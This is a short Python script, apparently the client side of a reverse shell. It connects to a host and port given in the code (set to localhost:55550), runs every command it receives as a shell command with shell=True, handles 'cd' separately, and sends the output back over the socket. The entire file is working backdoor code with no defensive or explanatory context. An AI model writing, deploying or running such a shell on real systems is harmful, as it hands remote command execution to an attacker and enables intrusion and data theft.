import socket
import subprocess
import sys 
import os

host = "localhost"
#port = 40415
port = 55550


s=socket.socket()
s.connect((host,port))
while True:
    datos = s.recv(2048)
    if(datos[:2].decode("utf-8")=="cd"):
        os.chdir(datos[3:].decode("utf-8"))
    
    if len(datos) > 0:
        cmd = subprocess.Popen(datos[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read()+cmd.stderr.read()
        output_str = str(output_byte,"utf-8") 
        currentCWD = os.getcwd()+"> "

        s.send(str.encode(output_str+currentCWD))
        print(output_str)
